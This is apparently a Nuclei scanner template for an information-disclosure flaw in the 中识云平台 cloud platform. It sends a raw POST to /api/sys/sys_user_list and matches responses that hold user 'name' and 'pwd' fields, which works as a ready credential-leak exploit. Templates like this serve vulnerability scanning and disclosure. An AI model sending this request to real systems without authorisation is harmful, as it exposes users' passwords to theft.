id: zhongshiyunpingtai-sys_user_list-Information-disclosure

info:
  name: 中识云平台 sys_user_list 信息泄露漏洞
  author: zhongshiyunpingtai
  severity: medium
  tags: Information disclosure

http:
  - raw:
      - |
        POST /api/sys/sys_user_list?userName=admin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"page":1,"limit":10,"username":""}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"Ok!"'
          - '"name":'
          - '"pwd":'
        condition: and
      - type: status
        status: 
          - 200